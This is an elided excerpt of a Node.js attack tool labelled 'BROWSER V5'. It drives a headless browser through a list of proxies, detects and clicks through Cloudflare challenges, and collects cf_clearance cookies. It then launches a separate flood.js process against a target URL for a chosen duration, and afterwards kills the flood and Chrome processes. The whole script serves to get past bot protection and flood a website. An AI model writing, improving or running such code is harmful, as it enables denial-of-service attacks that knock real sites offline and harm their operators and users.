...
function colored(colorCode, text) {
    console.log(colorCode + text + quancnc.COLOR_RESET);
}
...
if (process.argv.length < 8) {
  console.clear();
console.log(`
  ${chalk.cyanBright('BROWSER V5')} | Updated: 25 10 2025
...
async function solvingCaptcha(browser, page, browserProxy) {
    ...
    try {
        ...
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            colored(quancnc.COLOR_YELLOW, `[INFO] Cloudflare challenge detected`);
            colored(quancnc.COLOR_YELLOW, `[INFO] Proxy: ${maskProxy(browserProxy)} - Attempting to solve challenge...`);
            ...
            for (let attempt = 1; attempt <= 2; attempt++) {
                try {
                    ...
                    if (captchaDiv) {
                        colored(quancnc.COLOR_BRIGHT_BLUE, "[DEBUG] Found captcha div with proxy: " + maskProxy(browserProxy));
                    ...
                    if (customCaptcha) {
                        colored(quancnc.COLOR_BRIGHT_BLUE, "[DEBUG] Found custom turnstile with proxy: " + maskProxy(browserProxy));
                    ...
                    if (!iframeElement) {
                        colored(quancnc.COLOR_RED, "[ERROR] Cannot access iframe");
                        continue;
                    }
                    ...
                    colored(quancnc.COLOR_BRIGHT_BLUE, "[DEBUG] Challenge button clicked");
                    const newContent = await page.content();
                    if (newContent.includes("cloudflare.challenges.com") || newContent.includes("challenge-platform")) {
                        colored(quancnc.COLOR_BRIGHT_BLUE, `[DEBUG] Challenge not resolved, retry ${attempt}/2 with proxy: ${maskProxy(browserProxy)}`);
                        continue;
                    }
                    colored(quancnc.COLOR_BRIGHT_BLUE, "[DEBUG] Challenge resolved with proxy: " + maskProxy(browserProxy));
                    return true;
                } catch (err) {
                    if (err.message.includes("detached") || err.message.includes("Click failed")) {
                        colored(quancnc.COLOR_YELLOW, `[DEBUG] Node issue, retrying attempt ${attempt}/2 with proxy: ${maskProxy(browserProxy)}`);
                        continue;
                    }
                    throw err;
                }
        ...
        colored(quancnc.COLOR_BRIGHT_BLUE, "[DEBUG] No Cloudflare challenge detected");
        return true;
    } catch (error) {
        colored(quancnc.COLOR_RED, `[ERROR] ${error}`);
        return false;
    }
}
...
async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 2) {
    ...
    try {
        ...
        if (!cookies || !cookies.some(cookie => cookie.name === 'cf_clearance' && cookie.value.trim().length > 10)) {
            colored(quancnc.COLOR_RED, "[ERROR] Failed to solve challenge with proxy: " + maskProxy(browserProxy));
            return;
        }
...
async function startthread(targetURL, browserProxy, task, done, retries = 0) {
    ...
    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
         if (response) {
                if (response.title === "Attention Required! | Cloudflare") {
                 colored(quancnc.COLOR_RED, "[INFO] Blocked by Cloudflare. Exiting.")
                return;
            }
            if (!response.cookies) {
                colored(quancnc.COLOR_RED, `[ERROR] No cookies with proxy: ${maskProxy(browserProxy)}`);
                return;
            } 
            cookieCount++;
            const cookies = `[INFO] Title: ${response.title} | Proxy: ${maskProxy(browserProxy)} | Total solve: ${cookieCount} | Cookies: ${response.cookies}`;
            colored(quancnc.COLOR_GREEN, cookies);
            ...
            try {
                ...
                colored(quancnc.COLOR_RED, "[INFO] Error spawning flood.js: " + error.message);
            }
        ...
        console.log(`[ERROR] Error in startthread for proxy ${maskProxy(browserProxy)}: ${error.message}`);
        await startthread(targetURL, browserProxy, task, done, retries + 1);
    }
}
...
queue.drain(function() {
    colored(quancnc.COLOR_RED, "[INFO] All proxies processed")
    process.exit(1)
});

async function main() {
    if (proxies.length === 0) {
        colored(quancnc.COLOR_RED, "[ERROR] No proxies found in file. Exiting.");
        process.exit(1)
    }
    ...
    setTimeout(() => {
        colored(quancnc.COLOR_YELLOW, "[INFO] Time's up! Cleaning up...");
        queue.kill();
        exec('pkill -f flood.js', (err) => {
            if (err && err.code !== 1) {
                
            } else {
                colored(quancnc.COLOR_GREEN, "[INFO] Successfully killed flood.js processes")
            }
        });
        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                ...
                colored(quancnc.COLOR_GREEN, "[INFO] Successfully killed Chrome processes")
            }
        });
        setTimeout(() => {
            colored(quancnc.COLOR_GREEN, "[INFO] Exiting");
            process.exit(0)
        }, 5000)
    }, duration * 1000)
}
console.clear();
colored(quancnc.COLOR_GREEN, "[INFO] Running...");
colored(quancnc.COLOR_GREEN, `[INFO] Target: ${targetURL}`)
colored(quancnc.COLOR_GREEN, `[INFO] Duration: ${duration} seconds`)
colored(quancnc.COLOR_GREEN, `[INFO] Proxies: ${proxies.length} | Filename: ${proxyFile}`)
main().catch(err => {
    colored(quancnc.COLOR_RED, "[ERROR] Main function error: " + err.message);
    process.exit(1)
});